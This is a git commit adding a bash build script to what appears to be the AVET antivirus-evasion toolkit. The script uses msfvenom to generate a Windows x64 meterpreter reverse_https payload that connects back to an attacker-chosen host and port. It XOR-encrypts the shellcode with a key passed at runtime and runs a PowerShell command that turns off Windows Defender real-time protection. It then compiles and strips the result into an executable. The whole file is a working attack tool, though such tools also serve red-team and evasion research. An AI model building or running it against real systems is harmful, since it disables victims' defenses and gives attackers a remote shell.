2c09e5960f0e2b6770b18d0e9e6fce11ba2bdc0e
Florian Saager <florian.saager@rub.de>
2019-06-19 14:25:05 +0200

    Added win64 example preexec script that tries to disable Windows Defender

---
+++ build/build_win64_meterpreter_rev_https_xor_dynamic_disable_windef_powershell.sh
@@ -0,0 +1,63 @@
+#!/bin/bash    
+# Execute 64-bit shellcode.
+# Encrypts the payload with a dynamic XOR key, which needs to be provided via command line argument 2 to decrypt.
+# Attempts to disable Windows Defender's real-time protection via Powershell command "Set-MpPreference -DisableRealtimeMonitoring $true".
+
+
+# print AVET logo
+cat banner.txt
+
+# include script containing the compiler var $win64_compiler
+# you can edit the compiler in build/global_win64.sh
+# or enter $win64_compiler="mycompiler" here
+. build/global_win64.sh
+
+# import feature construction interface
+. build/feature_construction.sh
+
+# import global default lhost and lport values from build/global_connect_config.sh
+. build/global_connect_config.sh
+
+# override connect-back settings here, if necessary
+LPORT=$GLOBAL_LPORT
+LHOST=$GLOBAL_LHOST
+
+# make meterpreter reverse payload
+msfvenom -p windows/x64/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x64/xor -f c --platform Windows > input/sc_c.txt
+
+# try to disable Windows Defender's real-time protection via powershell
+set_command_source static_from_here 'Set-MpPreference -DisableRealtimeMonitoring $true'
+set_command_exec exec_via_powershell
+
+# generate key file
+generate_key preset aabbcc12de input/key_raw.txt
+
+# encrypt payload
+encode_payload xor input/scraw.txt input/scenc_raw.txt input/key_raw.txt
+
+# convert to c array format for static include
+./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf
+
+# set encrypted payload as source
+set_payload_source static_from_file input/scenc_c.txt
+
+# set decoder and key source
+# key is retrieved in hex format from command line
+set_decoder xor
+set_key_source from_command_line_hex
+
+# set payload info source
+set_payload_info_source none
+
+# set shellcode binding technique
+set_payload_execution_method exec_shellcode64
+
+# enable debug output
+enable_debug_print
+
+# call make_avet, compile 
+$win64_compiler -o output/output.exe source/avet.c
+strip output/output.exe
+
+# cleanup
+cleanup_techniques
